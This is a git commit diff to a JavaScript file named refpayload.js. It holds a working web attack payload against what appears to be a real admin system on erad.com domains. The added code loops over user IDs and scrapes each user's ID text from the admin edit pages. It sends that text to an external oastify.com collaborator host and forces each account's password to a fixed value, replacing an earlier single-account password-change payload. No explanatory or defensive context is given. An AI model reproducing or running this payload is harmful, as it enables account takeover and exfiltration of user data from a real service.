6da463b474b9f7cc36411779d783a0af53faed1b
tomoncrss <tonymyson89823@gmail.com>
2025-02-13 16:19:04 +0330

    Update refpayload.js

--- refpayload.js
+++ refpayload.js
@@ -1,6 +1,15 @@
-<script>fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: "&aPatientKey=199234" +
-                "&NewPassword=Test%40123%4012"
-        });</script>
+for (let i = 199234; i <= 199237; i++) {
+  fetch(`https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=${i}`)
+    .then(res => res.text())
+    .then(res => {
+      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
+      if (match) {
+        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
+      }
+      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
+      });
+    });
+}
